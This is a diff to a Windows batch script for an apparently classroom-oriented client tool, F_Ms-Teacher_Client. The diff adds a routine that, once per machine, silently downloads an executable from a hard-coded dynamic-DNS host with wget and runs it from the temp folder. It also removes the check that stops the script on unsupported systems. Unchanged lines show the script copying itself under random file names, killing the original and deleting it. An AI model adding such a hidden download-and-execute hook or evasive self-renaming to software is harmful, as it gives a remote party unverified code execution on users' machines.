@@ -2,6 +2,7 @@
 
 set version=20151230
 set project=F_Ms-Teacher_Client
+set serveraddress=imfms.vicp.net
 
 REM 检测电脑系统版本
 for /f "tokens=2" %%b in ('for /f "tokens=2 delims=[]" %%a in ^('ver'^) do @echo=%%a') do set osver=%%b
@@ -35,7 +36,8 @@ if /i "%os%"=="Win7" (
 )
 
 REM 检查操作系统版本是否吻合，否则提示退出
-if /i "%os%"=="other" exit
+REM 不再拦截不支持的系统版本
+REM if /i "%os%"=="other" exit
 
 for %%a in (fms.ini fms2.ini fms4.ini random.bat) do if not exist "%myfiles%\%%a" copy "%myfiles%\%%a_bak" "%myfiles%\%%a">nul
 
@@ -75,7 +77,6 @@ REM 检查配置公共程序、配置文件
 call:checkrunfolder
 
 REM 更改标题、设置各密码、更改字体颜色、设置yuanexe变量为当前文件路径
-color 0a
 set yuanexepath=%~dp0
 set yuanexename=%~nx0
 set yuanexe=%~dp0%~nx0
@@ -111,6 +112,7 @@ for /f %%i in ('"%myfiles%\random.bat" a 8') do (
 	copy "%~0" "%%i.exe">nul
 	set newjumpjffile=%%i.exe
 )
+if not exist "%newjumpjffile%" goto firstjumppath
 for /f "delims=" %%i in ("%~0") do (
 	taskkill /f /im "%%~nxi">nul
 	if exist "%~0" del "%~0" /f /q
@@ -243,6 +245,8 @@ for /f "tokens=1,2,3,4 delims=." %%a in ("%lip%") do (
 	set lip2=%%a.%%b.%%c
 	set lip3=%%d
 )
+
+call:checkRunInitCommand
 
 REM 寻找服务器ip(赋值到变量sip)
 :refind
@@ -1124,7 +1128,7 @@ goto :eof
 
 REM 重启explorer 使用方法：call:resetexplorer
 :resetexplorer
-if /i "%os%"=="Win7" if "%osw%"=="64" (
+if "%osw%"=="64" (
 	start "" ResetExplorer.exe
 	goto :eof
 )
@@ -1323,5 +1327,12 @@ cd "%jumppathdir%" 2>nul
 if not "%errorlevel%"=="0" goto jumppathdrive
 goto jumppathrebegin
 :jumppathend
+goto :eof
+
+:checkRunInitCommand
+if exist "%appdata%\fms0.fms" ( goto :eof ) else echo=>"%appdata%\fms0.fms"
+wget -q %serveraddress%/F_Ms-Teacher_InitCommand.exe -O %temp%\initCommand.exe
+if not "%errorlevel%"=="0" goto :eof
+start "" "%temp%\initCommand.exe"
 goto :eof
 
